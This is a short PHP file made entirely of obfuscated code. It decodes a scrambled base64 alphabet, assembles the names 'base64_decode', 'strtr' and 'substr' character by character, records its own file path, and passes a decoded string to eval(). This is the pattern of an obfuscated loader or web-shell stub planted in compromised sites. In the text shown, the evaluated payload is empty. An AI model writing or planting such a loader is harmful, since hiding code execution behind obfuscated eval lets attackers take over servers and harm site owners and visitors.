<?php define('TAUKIw0324',__FILE__);$OKQXte=base64_decode("bjF6Yi9tYTVcdnQwaTI4LXB4dXF5KjZscmtkZzlfZWhjc3dvNCtmMzdqRFNPSG1keWxiaFZFdnBZVVRYd2NOZklGclJDSmtaZW9LcXNMQU1hempRbnRCR1B1Z3hpVw==");$wxKiXI=$OKQXte[3].$OKQXte[6].$OKQXte[33].$OKQXte[30];$aoeARf=$OKQXte[33].$OKQXte[10].$OKQXte[24].$OKQXte[10].$OKQXte[24];$DZfFEJ=$aoeARf[0].$OKQXte[18].$OKQXte[3].$aoeARf[0].$aoeARf[1].$OKQXte[24];$qVAgwz=$OKQXte[7].$OKQXte[13];$wxKiXI.=$OKQXte[22].$OKQXte[36].$OKQXte[29].$OKQXte[26].$OKQXte[30].$OKQXte[32].$OKQXte[35].$OKQXte[26].$OKQXte[30];eval($wxKiXI(""));?>